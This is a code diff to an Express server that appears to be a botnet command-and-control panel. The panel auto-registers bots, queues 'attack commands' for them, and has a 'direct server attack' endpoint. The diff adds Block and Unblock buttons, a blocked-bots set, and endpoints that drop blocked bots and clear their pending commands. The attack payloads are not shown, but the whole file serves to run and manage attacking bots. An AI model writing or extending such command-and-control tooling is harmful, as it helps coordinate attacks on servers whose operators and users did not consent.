@@ -278,10 +278,16 @@ app.get('/', (req, res) => {
                             <div class="text-xs text-gray-500">Bot #\${index + 1} | Auto-approved at \${bot.time}</div>
                         </div>
                     </div>
-                    <button onclick="removeBot(\${index})" 
-                        class="text-red-400 hover:text-red-300 text-sm">
-                        Remove
-                    </button>
+                    <div class="flex gap-2">
+                        <button onclick="removeBot(\${index})" 
+                            class="text-yellow-400 hover:text-yellow-300 text-sm px-2 py-1 bg-yellow-900/30 rounded">
+                            Remove
+                        </button>
+                        <button onclick="blockBot(\${index})" 
+                            class="text-red-400 hover:text-red-300 text-sm px-2 py-1 bg-red-900/30 rounded">
+                            Block
+                        </button>
+                    </div>
                 </div>
             \`).join('');
         }
@@ -291,7 +297,31 @@ app.get('/', (req, res) => {
             bots.splice(index, 1);
             renderBots();
             updateStats();
-            addLog(\`Bot removed: \${bot.url}\`, 'info');
+            addLog(\`Bot removed (temporary): \${bot.url}\`, 'info');
+        }
+
+        async function blockBot(index) {
+            const bot = bots[index];
+            
+            if (!confirm(\`Permanently block this bot?\n\n\${bot.url}\n\nThe bot will not be able to reconnect.\`)) {
+                return;
+            }
+
+            try {
+                const response = await fetch(\`/block-bot?bot=\${encodeURIComponent(bot.url)}\`);
+                const data = await response.json();
+                
+                if (data.success) {
+                    bots.splice(index, 1);
+                    renderBots();
+                    updateStats();
+                    addLog(\`✅ Bot permanently blocked: \${bot.url}\`, 'success');
+                } else {
+                    addLog(\`❌ Failed to block bot: \${data.error}\`, 'error');
+                }
+            } catch (error) {
+                addLog(\`❌ Error blocking bot: \${error.message}\`, 'error');
+            }
         }
 
         function removeAllBots() {
@@ -494,6 +524,7 @@ app.get('/', (req, res) => {
 // Pending attack commands queue
 let pendingCommands = {};
 let stopCommands = new Set(); // Track which bots should stop
+let blockedBots = new Set(); // Track blocked bot URLs
 
 // Auto-register endpoint - bots call this to register themselves
 app.post('/register', (req, res) => {
@@ -501,6 +532,16 @@ app.post('/register', (req, res) => {
 
   if (!url) {
     return res.status(400).json({ error: 'Bot URL required' });
+  }
+
+  // Check if bot is blocked
+  if (blockedBots.has(url)) {
+    console.log(`[BLOCKED] Bot tried to register: ${url}`);
+    return res.status(403).json({ 
+      error: 'Bot is blocked',
+      approved: false,
+      message: 'This bot has been permanently blocked by the server'
+    });
   }
 
   // Check if bot already registered
@@ -629,6 +670,48 @@ app.get('/stop-all', async (req, res) => {
   });
 
   res.json({ success: true, message: `Stop queued for ${connectedBots.length} bots` });
+});
+
+// Block/Unblock bot endpoint
+app.get('/block-bot', (req, res) => {
+  const { bot } = req.query;
+
+  if (!bot) {
+    return res.json({ success: false, error: 'Bot URL required' });
+  }
+
+  // Add to blocked list
+  blockedBots.add(bot);
+  
+  // Remove from connected bots
+  connectedBots = connectedBots.filter(b => b.url !== bot);
+  
+  // Clear any pending commands
+  delete pendingCommands[bot];
+  stopCommands.delete(bot);
+
+  console.log(`[BLOCKED] Bot permanently blocked: ${bot}`);
+
+  res.json({ success: true, message: 'Bot blocked permanently', bot });
+});
+
+// Unblock bot endpoint
+app.get('/unblock-bot', (req, res) => {
+  const { bot } = req.query;
+
+  if (!bot) {
+    return res.json({ success: false, error: 'Bot URL required' });
+  }
+
+  blockedBots.delete(bot);
+  console.log(`[UNBLOCKED] Bot unblocked: ${bot}`);
+
+  res.json({ success: true, message: 'Bot unblocked', bot });
+});
+
+// Get blocked bots list
+app.get('/blocked', (req, res) => {
+  res.json({ blocked: Array.from(blockedBots) });
 });
 
 // Direct server attack endpoint
